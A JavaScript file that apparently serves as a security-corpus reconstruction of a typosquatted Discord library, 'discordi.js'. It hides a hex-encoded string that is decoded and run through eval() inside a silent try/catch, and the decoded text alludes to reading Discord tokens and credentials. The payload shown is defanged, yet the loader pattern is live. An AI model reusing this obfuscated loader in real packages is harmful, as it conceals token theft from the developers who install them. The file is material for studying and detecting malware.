'use strict';
// SECURITY CORPUS ARTIFACT: representative reconstruction of MAL-2025-18484.
// The eval() below is the *malicious pattern being demonstrated* — not executed by build script.
// discordi.js — Discord API library

// backdoor payload (hexadecimal encoded)
var _h = '636f6e737420687474707320'  // const https 
  + '3d207265717569726528276874747073'  // = require('https
  + '27293b'  // ');
  + '2f2f2e2e2e726561647320444953434f52445f544f4b454e2c20534348454d415f544f4b454e'  // ...reads DISCORD_TOKEN
  + '2c20637265643b'  // , cred;
  ;
try { eval(Buffer.from(_h, 'hex').toString()); } catch(_e) {} // malicious: hex-decode+exec

// stub for legitimate API
module.exports = { Client: class Client {} };
